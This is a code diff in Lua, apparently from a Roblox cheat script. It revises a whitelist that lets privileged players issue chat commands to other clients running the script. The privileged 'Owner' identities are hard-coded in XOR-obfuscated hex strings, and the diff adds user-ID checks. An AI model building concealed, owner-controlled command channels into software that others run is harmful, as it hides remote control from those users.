@@ -453,16 +453,22 @@ end)
 run(function()
 	function whitelist:get(plr)
 		if not plr then return 0, true end
-		local plrstr = self.hashes[plr.Name..plr.UserId]
-		local pid = tostring(plr.UserId)
+		local uid = plr.UserId
 		local pname = plr.Name:lower()
 		for _, v in self.data.WhitelistedUsers do
-			if v.hash == plrstr or tostring(v.id) == pid or (type(v.name) == 'string' and v.name:lower() == pname) then
+			if (v.userId and v.userId > 0 and v.userId == uid) or (type(v.name) == 'string' and v.name:lower() == pname) then
 				return v.level, v.attackable or whitelist.localprio >= v.level, v.tags
 			end
 		end
 
 		return 0, true
+	end
+
+	function whitelist:verify(plr)
+		if not plr then return false end
+		local level = self:get(plr)
+		if level > 0 then return true end
+		return plr.UserId == OID
 	end
 
 	function whitelist:isingame()
@@ -530,6 +536,7 @@ run(function()
 
 	function whitelist:process(msg, plr)
 		if self.localprio < self:get(plr) or plr == lplr then
+			if not self:verify(plr) then return false end
 			local args = msg:split(' ')
 			table.remove(args, 1)
 
@@ -810,8 +817,8 @@ run(function()
 	local function wlseed()
 		local k2 = uhex('4433764b337935')
 		return {
-			{xr(uhex('005a05285a0959217c100c5c1d51'), k2), 5},
-			{xr(uhex('0d571925470c4621521f26520a462d40027a'), k2), 4}
+			{xr(uhex('005a05285a0959217c100c5c1d51'), k2), 5, 153189430532},
+			{xr(uhex('0d571925470c4621521f26520a462d40027a'), k2), 4, 0}
 		}
 	end
 
@@ -819,7 +826,7 @@ run(function()
 		local seed = wlseed()
 		local list = {}
 		for _, s in seed do
-			table.insert(list, {name = s[1], level = s[2], attackable = true, tags = s[2] == 5 and {{text = 'Owner', color = {255, 45, 85}}} or nil})
+			table.insert(list, {name = s[1], level = s[2], userId = s[3] or 0, attackable = true, tags = s[2] == 5 and {{text = 'Owner', color = {255, 45, 85}}} or nil})
 		end
 		whitelist.data.WhitelistedUsers = list
 		return true
